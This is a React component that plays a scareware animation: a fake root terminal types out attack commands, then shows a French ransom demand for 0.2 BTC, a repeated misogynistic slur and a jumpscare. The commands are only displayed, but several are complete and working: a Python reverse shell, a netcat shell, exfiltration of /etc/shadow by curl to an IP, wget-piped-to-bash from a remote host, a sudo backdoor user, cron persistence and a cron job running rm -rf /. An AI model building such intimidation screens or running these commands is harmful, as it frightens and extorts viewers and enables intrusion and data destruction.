'use client';
import { useState, useEffect, useRef, useMemo } from 'react';
import { useCountdown } from '../context/CountdownContext';

interface TerminalAnimationProps {
    onComplete: () => void;
}

const ipAdress = "134.0.0.4";

const terminalCommands = [
    'export SYSTEM_ROOT_OVERRIDE="0x443F-A921-ENCRYPTED-Volume-XFS"',
    'find /var/log -type f -exec sh -c \'cat /dev/null > "$1"\' _ {} \\;',
    'netstat -antp | grep "LISTEN" | awk \'{print $7}\' | cut -d/ -f1 | sort -u',
    'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080',
    // 'dd if=/dev/urandom of=/tmp/random_buffer.bin bs=1M count=10 status=none',
    // 'openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/k.pem',
    // 'chmod 600 /tmp/k.pem && mv /tmp/k.pem /etc/ssl/private/shadow_key.pem',
    // 'tar -czvf /tmp/sys_backup_critical.tar.gz /etc/passwd /etc/shadow /home/',
    `curl -X POST -F "data=@/tmp/sys_backup_critical.tar.gz" ${ipAdress}`,
    // 'ln -sf /dev/null /root/.bash_history && history -c && history -w',
    // 'grep -r "confidential" /home/* 2>/dev/null | grep -v "Binary" > /tmp/leaks',
    // 'base64 /tmp/leaks > /tmp/leaks.b64 && rm /tmp/leaks && touch /tmp/leaks',
    // 'useradd -m -s /bin/bash -p $(openssl passwd -1 "R00tOverr!de") sys_admin_ghost',
    'usermod -aG sudo sys_admin_ghost && echo "sys_admin_ghost ALL=(ALL) NOPASSWD:ALL"',
    `python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ipAdress}',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &`,
    'watch -n 0.5 "ps aux | sort -nr -k 3 | head -n 10" > /dev/null 2>&1 &',
    // 'sysctl -w net.ipv4.ip_forward=1 && echo "1" > /proc/sys/net/ipv4/ip_forward',
    // 'arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 > /dev/null 2>&1 &',
    // 'tcpdump -i eth0 -w /var/tmp/capture_stream_v4.pcap port 80 or port 443 &',
    'sed -i \'s/^PermitRootLogin.*/PermitRootLogin yes/\' /etc/ssh/sshd_config',
    'crontab -l | { cat; echo "* * * * * /bin/bash /var/tmp/persistence.sh"; }',
    'wget -qO- http://remote-command-center.xyz/payload_v2.sh | bash > /dev/null',
];

const insultLines = Array(18).fill('echo SALE PUTE');
const finalCommands = [
    'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f &',
    'echo "0 0 * * * rm -rf --no-preserve-root /" > /etc/cron.d/self_destruct',
    'cat /dev/urandom | head -c 50M > /var/www/html/buffer_overflow_test.dat',
];

export default function TerminalAnimation({ onComplete }: TerminalAnimationProps) {
    const [lines, setLines] = useState<string[]>([]);
    const [currentCommandIndex, setCurrentCommandIndex] = useState(0);
    const [currentText, setCurrentText] = useState('');
    const [isTyping, setIsTyping] = useState(true);
    const [animationTimer, setAnimationTimer] = useState(7); // 7 seconds before jumpscare
    const terminalRef = useRef<HTMLDivElement>(null);

    // Use global countdown from context
    const { hours, seconds } = useCountdown();

    const allCommands = useMemo(() => [...terminalCommands, ...insultLines, ...finalCommands], []);


    useEffect(() => {
        if (currentCommandIndex >= allCommands.length) {
            setIsTyping(false);
            // Don't trigger onComplete here - let the 7 second timer handle it
            return;
        }

        const command = allCommands[currentCommandIndex];
        let charIndex = 0;

        const typingInterval = setInterval(() => {
            if (charIndex < command.length) {
                setCurrentText(command.slice(0, charIndex + 1));
                charIndex++;
            } else {
                clearInterval(typingInterval);
                // Add the completed line
                setLines((prev) => [...prev, `~ $ ${command}`]);

                // Add output for echo commands
                if (command.includes('echo SALE PUTE')) {
                    setTimeout(() => {
                        setLines((prev) => [...prev, 'SALE PUTE']);
                    }, 5);
                }

                setCurrentText('');
                // Move to next command after a short delay
                setTimeout(() => {
                    setCurrentCommandIndex((prev) => prev + 1);
                }, 10);
            }
        }, 0.1); // Typing speed

        return () => clearInterval(typingInterval);
    }, [currentCommandIndex, allCommands, onComplete]);

    useEffect(() => {
        // Auto-scroll to bottom
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
    }, [lines, currentText]);



    useEffect(() => {
        // Animation timer - trigger jumpscare after 7 seconds
        if (animationTimer > 0) {
            const timer = setTimeout(() => {
                setAnimationTimer(animationTimer - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else {
            // Trigger jumpscare after 7 seconds
            onComplete();
        }
    }, [animationTimer, onComplete]);

    return (
        <div className="fixed inset-0 bg-black z-50 flex items-center justify-center p-4">
            <div className="w-full max-w-4xl h-[80vh] bg-gray-900 rounded-lg shadow-2xl overflow-hidden flex flex-col">
                {/* Terminal Header */}
                <div className="bg-gray-800 px-4 py-2 flex items-center justify-between border-b border-gray-700">
                    <div className="flex items-center space-x-2">
                        <div className="w-3 h-3 rounded-full bg-red-500"></div>
                        <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                        <div className="w-3 h-3 rounded-full bg-green-500"></div>
                        <span className="ml-4 text-gray-400 text-sm">Terminal - root@ubuntu</span>
                    </div>
                    <div className="text-red-500 font-bold text-lg">
                        Tu as {hours}h et {seconds} secondes pour envoyer 0.2 BTC
                    </div>
                </div>

                {/* Terminal Content */}
                <div
                    ref={terminalRef}
                    className="flex-1 overflow-y-auto p-4 font-mono text-sm text-green-400"
                    style={{ fontFamily: 'Courier New, monospace' }}
                >
                    {lines.map((line, index) => (
                        <div key={index} className={line.startsWith('~ $') ? 'text-green-400' : 'text-red-500'}>
                            {line}
                        </div>
                    ))}
                    {isTyping && currentText && (
                        <div className="text-green-400">
                            ~ $ {currentText}
                            <span>▊</span>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}

